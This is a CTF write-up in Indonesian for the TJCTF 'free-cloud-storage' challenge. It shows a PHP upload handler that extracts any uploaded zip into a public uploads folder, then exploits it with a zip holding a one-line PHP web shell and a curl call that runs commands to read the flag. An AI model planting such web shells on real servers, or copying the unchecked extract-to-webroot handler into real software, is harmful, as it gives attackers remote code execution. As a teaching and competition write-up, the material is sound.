# free-cloud-storage

> Free cloud storage, what could possibly go wrong?

Diberikan file chall.zip, ketika di unzip, terdapat beberapa file.

```
$ unzip chall.zip 
Archive:  chall.zip
  inflating: flag.php                
  inflating: upload.php              
  inflating: index.html              
  inflating: composer.json 
```

Berikut isi file index.html:

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free Cloud Storage</title>
</head>
<body>
    <h1>Free Cloud Storage</h1>
    <div class="container">
        <p>Our 100% legit cloud storage service provides all the space you need for your needs!</p>
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <input type="file" name="zipfile" accept=".zip" required>
            <button type="submit">Upload</button>
        </form>
    </div>
</body>
</html>
```

Berikut isi file upload.php:

```php
<?php
require 'vendor/autoload.php';

use Chumper\Zipper\Zipper;

$uploadDir = __DIR__ . '/uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (!isset($_FILES['zipfile'])) {
        die("No file uploaded.");
    }

    $tmpName = $_FILES['zipfile']['tmp_name'];
    $fileName = basename($_FILES['zipfile']['name']);

    if (pathinfo($fileName, PATHINFO_EXTENSION) !== 'zip') {
        die("Only zip files allowed.");
    }

    $destination = $uploadDir . $fileName;

    if (!move_uploaded_file($tmpName, $destination)) {
        die("Upload failed.");
    }

    echo "<p>File uploaded. Extracting...</p>";

    $zipper = new Zipper(); 

    $zipper->make($destination)->extractTo($uploadDir);

    echo "<p>Extraction complete!</p>";
}
?>

<!DOCTYPE html>
<html>
<body>
<h2>Upload your ZIP file</h2>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="zipfile" required>
    <button type="submit">Upload</button>
</form>
</body>
</html>
```

Program meminta input berupa zip, yang nantinya akan di ekstrak dan disimpan pada /uploads/. Untuk menyelesaikan challenge ini, kita tinggal menyimpan file php yang berisi script RCE lalu dibungkus dengan zip.

```python
import zipfile

# Buat file ZIP dengan path traversal
with zipfile.ZipFile('a.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('shell.php', '<?php system($_GET["cmd"]); ?>')
```

Ketika aplikasi menyimpan program tersebut, kita mendapat akses shell dengan parameter ?cmd. Kita hanya perlu membaca file flag.txt

```bash
$ curl https://free-cloud-storage-0ec42422e8e90f9c.tjc.tf/uploads/shell.php?cmd=cat%20../flag.txt
tjctf{i_l0v3_fr33_st0r4g3}
```

